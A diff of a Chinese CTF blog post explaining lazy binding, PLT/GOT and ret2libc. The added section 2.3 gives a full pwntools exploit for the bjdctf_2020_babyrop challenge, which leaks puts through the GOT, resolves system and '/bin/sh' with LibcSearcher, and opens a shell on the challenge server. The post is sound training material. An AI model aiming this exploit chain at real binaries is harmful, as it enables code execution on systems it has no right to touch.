@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="在上一篇博客，我们介绍了栈溢出基本原理（ https:&#x2F;&#x2F;wutong01304.github.io&#x2F;2023&#x2F;07&#x2F;05&#x2F;stack&#x2F; ）。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此">
+        <meta name="description" content="在上一篇博客，我们介绍了栈溢出基本原理。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2libc+延迟绑定机制">
 <meta property="og:url" content="https://wutong01304.github.io/2023/07/07/ret2libc/index.html">
 <meta property="og:site_name" content="wutong">
-<meta property="og:description" content="在上一篇博客，我们介绍了栈溢出基本原理（ https:&#x2F;&#x2F;wutong01304.github.io&#x2F;2023&#x2F;07&#x2F;05&#x2F;stack&#x2F; ）。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此">
+<meta property="og:description" content="在上一篇博客，我们介绍了栈溢出基本原理。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt1.png?x-oss-process=style/watermark">
 <meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt4.png?x-oss-process=style/watermark">
@@ -40,8 +40,11 @@
 <meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret5.png?x-oss-process=style/watermark">
 <meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret4.png?x-oss-process=style/watermark">
 <meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret6.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret7.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret8.png?x-oss-process=style/watermark">
+<meta property="og:image" content="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret9.png?x-oss-process=style/watermark">
 <meta property="article:published_time" content="2023-07-07T10:29:01.000Z">
-<meta property="article:modified_time" content="2023-07-15T13:27:10.660Z">
+<meta property="article:modified_time" content="2023-07-17T01:22:33.804Z">
 <meta property="article:author" content="wutong">
 <meta property="article:tag" content="Pwn">
 <meta property="article:tag" content="Stack">
@@ -282,8 +285,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-15 21:27:10</span>
-            <span class="mobile">2023-07-15 21:27</span>
+            <span class="desktop">2023-07-17 09:22:33</span>
+            <span class="mobile">2023-07-17 09:22</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -322,7 +325,7 @@
             
 
             <div class="article-content markdown-body">
-                <p>在上一篇博客，我们介绍了栈溢出基本原理（ <a href="https://wutong01304.github.io/2023/07/05/stack/">https://wutong01304.github.io/2023/07/05/stack/</a> ）。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么如何泄露libc中的函数地址呢？这就要利用linux的延迟绑定机制了。</p>
+                <p>在上一篇博客，我们介绍了<a href="https://wutong01304.github.io/2023/07/05/stack/">栈溢出基本原理</a>。 通过劫持返回地址，可以使程序转去执行我们构造好的system函数，进而执行攻击。但如果没有直接的后门，且没有直接发现system函数该怎么办呢？我们需要知道：system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。因此如果我们知道libc.so其中一个函数的地址，那么通过计算偏移，就可以得到system函数的地址。那么如何泄露libc中的函数地址呢？这就要利用linux的延迟绑定机制了。</p>
 <h1 id="一、延迟绑定机制"><a href="#一、延迟绑定机制" class="headerlink" title="一、延迟绑定机制"></a>一、延迟绑定机制</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>延迟绑定机制是指在程序运行时，将符号的绑定工作推迟到符号第一次被调用的时候。这种机制可以大大加快程序的启动速度。简单来说，程序在未执行时，不会加载函数的真实地址，只有在执行时，才会通过ELF（可链接文件）文件去链接真实地址。而在延迟绑定机制中，需要注意的是<strong>PLT</strong>（Procedure Linkage Table，过程链接表）和<strong>GOT</strong>（Global Offset Table，全局偏移表），它们是ELF文件中的两个特殊节，分别用于延迟绑定和动态链接。</p>
 <p>ELF文件格式使用PLT技术来实现延迟绑定。PLT是一个特殊的表格，用于存储动态链接库中的函数地址。在程序启动时，如果需要调用某个函数，PLT会首先检查该函数是否已经被加载到内存中。如果函数还未被加载，则PLT会延迟绑定该函数，并在需要时<strong>动态加载该函数</strong>。这样可以在程序启动时加快执行速度，同时避免不必要的内存占用。</p>
 <p>PLT通过GOT表来动态加载函数。GOT表中的每个表项都存储了一个函数或变量的地址，当程序需要调用某个函数或访问某个变量时，操作系统会根据GOT表中的地址进行动态链接，以确保正确的函数或变量被调用。</p>
@@ -400,7 +403,7 @@
                      data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/plt7.png?x-oss-process=style/watermark"
                      
                 ></p>
-<p>发现里面是**_dl_runtime_resolve**函数，其作用是在程序运行时动态解析符号（函数或变量）的地址，将在另外一篇文章中进行详细介绍：<a href="https://wutong01304.github.io/2023/07/15/ret2_dl_runtime_resolve/%E3%80%82">https://wutong01304.github.io/2023/07/15/ret2_dl_runtime_resolve/。</a></p>
+<p>发现里面是**_dl_runtime_resolve**函数，其作用是在程序运行时动态解析符号（函数或变量）的地址，将在另外一篇文章中进行详细介绍。</p>
 <p>总结出第一次调用函数寻找地址的过程：xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</p>
 <p>流程图（图源网络：<a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/0ac63c3744dd%EF%BC%89%EF%BC%9A" >https://www.jianshu.com/p/0ac63c3744dd）： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>第一次调用：</p>
@@ -417,7 +420,7 @@
                      data-src="https://upload-images.jianshu.io/upload_images/5970003-9baedd55881a39dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"
                      
                 ></p>
-<h1 id="二、ret2libc"><a href="#二、ret2libc" class="headerlink" title="二、ret2libc"></a>二、ret2libc</h1><p>在上述分析中，我们知道，在程序中调用一个函数时，实际上会跳转到 PLT 中的一个特殊地址，该地址会将控制权转移到 GOT 中的相应地址，并且在第一次调用时，GOT 中的地址会被更新为真实的函数地址。因此我们可以利用泄露某个函数的真实地址，动态链接库中的函数之间相对偏移是固定的，因此其它函数的地址也可以泄露，然后使程序流转到其它函数，从而达到攻击的目的。</p>
+<h1 id="二、ret2libc"><a href="#二、ret2libc" class="headerlink" title="二、ret2libc"></a>二、ret2libc</h1><h2 id="2-1-泄露流程"><a href="#2-1-泄露流程" class="headerlink" title="2.1 泄露流程"></a>2.1 泄露流程</h2><p>在上述分析中，我们知道，在程序中调用一个函数时，实际上会跳转到 PLT 中的一个特殊地址，该地址会将控制权转移到 GOT 中的相应地址，并且在第一次调用时，GOT 中的地址会被更新为真实的函数地址。因此我们可以利用泄露某个函数的真实地址，动态链接库中的函数之间相对偏移是固定的，因此其它函数的地址也可以泄露，然后使程序流转到其它函数，从而达到攻击的目的。</p>
 <p>利用PLT和GOT泄露地址的大致流程如下（以<strong>使用puts</strong>函数泄露puts函数真实地址为例）：</p>
 <ol>
 <li>利用缓冲区溢出，将程序的返回地址覆盖为 puts 函数在 PLT 中的地址，将其参数覆盖为将函数的got地址（puts_got，也可以是其它函数）。</li>
@@ -425,7 +428,7 @@
 <li>puts 函数将在 GOT 中找到真实的 puts 函数地址并将其打印到屏幕上。</li>
 <li>这样就可以在输出中获取 puts 函数的真实地址。</li>
 </ol>
-<p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[OGeek2019]babyrop" >https://buuoj.cn/challenges#[OGeek2019]babyrop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。也可以去buuctf上找，题目名字：[OGeek2019]babyrop</p>
+<h2 id="2-2-32位-ret2libc"><a href="#2-2-32位-ret2libc" class="headerlink" title="2.2 32位 ret2libc"></a>2.2 32位 ret2libc</h2><p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[OGeek2019]babyrop" >https://buuoj.cn/challenges#[OGeek2019]babyrop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。也可以去buuctf上找，题目名字：[OGeek2019]babyrop</p>
 <p>拿到文件用IDA反汇编分析，main函数如下：</p>
 <img  
                      lazyload
@@ -480,13 +483,45 @@
                       style="zoom:80%;" 
                 >
 
-<p>64位 ret2libc 溢出和32位大致相同，要注意构造的溢出流程，要先通过pop_rdi将参数传递给rdi寄存器，再执行函数，溢出图如下。就不进行举例了。</p>
+<h2 id="2-3-64位-ret2libc"><a href="#2-3-64位-ret2libc" class="headerlink" title="2.3 64位 ret2libc"></a>2.3 64位 ret2libc</h2><p>64位 ret2libc 溢出和32位大致相同，要注意构造的溢出流程，要先通过pop_rdi将参数传递给rdi寄存器，再执行函数，溢出图如下。</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret6.png?x-oss-process=style/watermark"
                       style="zoom:80%;" 
                 >
+
+<p>例题：<a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bjdctf_2020_babyrop" >https://buuoj.cn/challenges#bjdctf_2020_babyrop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，题目名字：bjdctf_2020_babyrop</p>
+<p>反汇编发现 vuln 函数中的 read 函数可以溢出：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret7.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>使用如下命令寻找pop rdi</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret8.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>exp：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29333</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=<span class="number">0x04006AD</span></span><br><span class="line">pop_rdi=<span class="number">0x0400733</span></span><br><span class="line">ret=<span class="number">0x04004c9</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.recvuntil(<span class="string">&quot;story!\n&quot;</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&quot;story!\n&quot;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>由于使用了LibcSearch，找到了不同版本的libc，在这里选择一个能用的就可以了（可以一个个尝试）：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2libc/ret9.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>在这里，选择了第0个libc，成功获取flag。</p>
 
             </div>
 
@@ -499,7 +534,7 @@
         <li><strong>Created at:</strong> 2023-07-07 18:29:01</li>
         
             <li>
-                <strong>Updated at:</strong> 2023-07-15 21:27:10
+                <strong>Updated at:</strong> 2023-07-17 09:22:33
             </li>
         
         <li>
@@ -537,6 +572,21 @@
             
                 <div class="article-nav">
                     
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/07/11/ret2syscall/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">ret2syscall+mprotect函数介绍</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
                     
                         <div class="article-next">
                             <a class="next"
@@ -566,7 +616,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">ret2libc+延迟绑定机制</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">一、延迟绑定机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.1 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E9%93%BE%E6%8E%A5%E9%87%8D%E5%AE%9A%E4%BD%8D"><span class="nav-text">1.2 链接重定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-PLT%E5%92%8CGOT"><span class="nav-text">1.3 PLT和GOT</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ret2libc"><span class="nav-text">二、ret2libc</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">一、延迟绑定机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.1 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E9%93%BE%E6%8E%A5%E9%87%8D%E5%AE%9A%E4%BD%8D"><span class="nav-text">1.2 链接重定位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-PLT%E5%92%8CGOT"><span class="nav-text">1.3 PLT和GOT</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ret2libc"><span class="nav-text">二、ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E6%B3%84%E9%9C%B2%E6%B5%81%E7%A8%8B"><span class="nav-text">2.1 泄露流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-32%E4%BD%8D-ret2libc"><span class="nav-text">2.2 32位 ret2libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-64%E4%BD%8D-ret2libc"><span class="nav-text">2.3 64位 ret2libc</span></a></li></ol></li></ol>
 
     </div>
 </div>
